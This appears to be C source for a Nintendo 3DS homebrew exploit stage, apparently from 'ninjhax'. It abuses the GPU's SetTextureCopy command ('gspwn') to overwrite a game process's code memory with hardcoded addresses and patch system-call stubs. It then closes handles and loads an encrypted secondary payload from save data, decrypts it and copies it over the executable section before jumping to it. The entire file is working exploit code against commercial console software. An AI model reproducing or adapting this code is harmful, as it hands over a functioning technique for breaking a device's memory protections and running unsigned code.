#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctr/types.h>
#include <ctr/srv.h>
#include <ctr/svc.h>
#include <ctr/FS.h>
#include "text.h"

#include "../../../build/constants.h"

int _strlen(char* str)
{
	int l=0;
	while(*(str++))l++;
	return l;
}

void _strcpy(char* dst, char* src)
{
	while(*src)*(dst++)=*(src++);
	*dst=0x00;
}

Result _srv_getServiceHandle(Handle* handleptr, Handle* out, char* server)
{
	u8 l=_strlen(server);
	if(!out || !server || l>8)return -1;

	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x50100; //request header code
	_strcpy((char*)&cmdbuf[1], server);
	cmdbuf[3]=l;
	cmdbuf[4]=0x0;

	Result ret=0;
	if((ret=svc_sendSyncRequest(*handleptr)))return ret;

	*out=cmdbuf[3];

	return cmdbuf[1];
}

// const u8 hexTable[]=
// {
// 	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'
// };

// void hex2str(char* out, u32 val)
// {
// 	int i;
// 	for(i=0;i<8;i++){out[7-i]=hexTable[val&0xf];val>>=4;}
// 	out[8]=0x00;
// }

// void drawHex(u32 val, int x, int y)
// {
// 	char str[9];

// 	hex2str(str,val);
// 	drawString(CN_TOPFBADR1,str,x,y);
// 	drawString(CN_TOPFBADR2,str,x,y);
// }

void doGspwn(u32* src, u32* dst, u32 size)
{
	Result (*nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue)(u32** sharedGspCmdBuf, u32* cmdAdr)=(void*)0x001C2B54;
	u32 gxCommand[]=
	{
		0x00000004, //command header (SetTextureCopy)
		(u32)src, //source address
		(u32)dst, //destination address
		size, //size
		0xFFFFFFFF, // dim in
		0xFFFFFFFF, // dim out
		0x00000008, // flags
		0x00000000, //unused
	};

	u32** sharedGspCmdBuf=(u32**)(0x356208+0x58);
	nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue(sharedGspCmdBuf, gxCommand);
}

Result _GSPGPU_InvalidateDataCache(Handle* handle, Handle kprocess, u32* addr, u32 size)
{
	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x00090082;
	cmdbuf[1]=(u32)addr;
	cmdbuf[2]=size;
	cmdbuf[3]=0x00000000;
	cmdbuf[4]=(u32)kprocess;

	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

void patchMem(Handle* gspHandle, u32 dst, u32 size, u32 start, u32 end)
{
	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u32* addr, u32 size)=(void*)0x002D15D4;

	int i;
	_GSPGPU_InvalidateDataCache(gspHandle, 0xFFFF8001, (u32*)0x14100000, 0x200);
	doGspwn((u32*)(dst), (u32*)(0x14100000), 0x200);
	svc_sleepThread(0x1000000);
	for(i=start;i<end;i++)((u32*)0x14100000)[i]=0xEF000009;
	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)0x14100000, 0x200);
	doGspwn((u32*)(0x14100000), (u32*)(dst), 0x200);
	svc_sleepThread(0x1000000);
}

Result _FSUSER_OpenFileDirectly(Handle* handle, Handle* out, FS_archive archive, FS_path fileLowPath, u32 openflags, u32 attributes) //no need to have archive opened
{
	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x08030204;
	cmdbuf[1]=0;
	cmdbuf[2]=archive.id;
	cmdbuf[3]=archive.lowPath.type;
	cmdbuf[4]=archive.lowPath.size;
	cmdbuf[5]=fileLowPath.type;
	cmdbuf[6]=fileLowPath.size;
	cmdbuf[7]=openflags;
	cmdbuf[8]=attributes;
	cmdbuf[9]=(archive.lowPath.size<<14)|0x802;
	cmdbuf[10]=(u32)archive.lowPath.data;
	cmdbuf[11]=(fileLowPath.size<<14)|2;
	cmdbuf[12]=(u32)fileLowPath.data;
 
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;
 
	if(out)*out=cmdbuf[3];
 
	return cmdbuf[1];
}

Result _FSFILE_Close(Handle handle)
{
	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x08080000;

	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result _FSFILE_Read(Handle handle, u32 *bytesRead, u64 offset, u32 *buffer, u32 size)
{
	u32 *cmdbuf=getThreadCommandBuffer();
 
	cmdbuf[0]=0x080200C2;
	cmdbuf[1]=(u32)offset;
	cmdbuf[2]=(u32)(offset>>32);
	cmdbuf[3]=size;
	cmdbuf[4]=(size<<4)|12;
	cmdbuf[5]=(u32)buffer;
 
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	if(bytesRead)*bytesRead=cmdbuf[2];

	return cmdbuf[1];
}

int _main()
{
	Handle* gspHandle=(Handle*)CN_GSPHANDLE_ADR;
	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u32* addr, u32 size)=(void*)CN_GSPGPU_FlushDataCache_ADR;

	// drawString(CN_TOPFBADR1,"ninjhaxx",0,0);
	// drawString(CN_TOPFBADR2,"ninjhaxx",0,0);

	Handle* srvHandle=(Handle*)CN_SRVHANDLE_ADR;

	int line=10;
	Result ret;

	Handle* addressArbiterHandle=(Handle*)0x334960;

	//close threads
		//patch waitSyncN
		patchMem(gspHandle, 0x14000000+CN_TEXTPAOFFSET+0x00192200, 0x200, 0x19, 0x4F);
		patchMem(gspHandle, 0x14000000+CN_TEXTPAOFFSET+0x00192600, 0x200, 0x7, 0x13);
		patchMem(gspHandle, 0x14000000+CN_TEXTPAOFFSET+0x001CA200, 0x200, 0xB, 0x1E);
		// patchMem(gspHandle, 0x14000000+CN_TEXTPAOFFSET+0x000C6100, 0x200, 0x3C, 0x52);
		*(u8*)0x359935=0x00; //kill thread5 without panicking the kernel...

		//patch arbitrateAddress
		patchMem(gspHandle, 0x14000000+CN_TEXTPAOFFSET+0x001C9E00, 0x200, 0x14, 0x40);

		//close handles
		ret=svc_closeHandle(*((Handle*)0x359938));
		ret=svc_closeHandle(*((Handle*)0x34FEA4));
		ret=svc_closeHandle(*((Handle*)0x356274));
		ret=svc_closeHandle(*((Handle*)0x334730));
		ret=svc_closeHandle(*((Handle*)0x334F64));

		//wake threads
		svc_arbitrateAddress(*addressArbiterHandle, 0x35811c, 0, -1, 0);
		svc_signalEvent(((Handle*)0x3480d0)[2]);
		s32 out; svc_releaseSemaphore(&out, *(Handle*)0x357490, 1);

	svc_sleepThread(0x10000000);

	//load secondary payload
	u32 secondaryPayloadSize;
	{
		Result ret;
		Handle* fsuHandle=(Handle*)CN_FSHANDLE_ADR;
		FS_archive saveArchive=(FS_archive){0x00000004, (FS_path){PATH_EMPTY, 1, (u8*)""}};

		//write secondary payload file
		Handle fileHandle;
		ret=_FSUSER_OpenFileDirectly(fsuHandle, &fileHandle, saveArchive, FS_makePath(PATH_CHAR, "/edit/payload.bin"), FS_OPEN_READ, FS_ATTRIBUTE_NONE);
		if(ret)*(u32*)NULL=0xC0DF0002;
		ret=_FSFILE_Read(fileHandle, &secondaryPayloadSize, 0x0, (u32*)0x14100000, 0xA000);
		if(ret)*(u32*)NULL=0xC0DF0003;
		ret=_FSFILE_Close(fileHandle);
		if(ret)*(u32*)NULL=0xC0DF0004;
	}

	//decrypt it
	{
		Result (*blowfishKeyScheduler)(u32* dst)=(void*)0x001A44BC;
		Result (*blowfishDecrypt)(u32* blowfishKeyData, u32* src, u32* dst, u32 size)=(void*)0x001A4B04;

		blowfishKeyScheduler((u32*)0x14200000);
		blowfishDecrypt((u32*)0x14200000, (u32*)0x14100000, (u32*)0x14100000, secondaryPayloadSize);
	}

	Result (*_DSP_UnloadComponent)(Handle* handle)=(void*)0x002BA368;
	Handle** dspHandle=(Handle**)0x334EFC;

	_DSP_UnloadComponent(*dspHandle);

	ret=_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)0x14100000, 0x300000);

	doGspwn((u32*)(0x14100000), (u32*)(0x14000000+CN_TEXTPAOFFSET), 0x0000A000);

	svc_sleepThread(0x3B9ACA00);


	void (*reset)(int size)=(void*)0x00100000;
	reset(0);

	while(1);
	return 0;
}
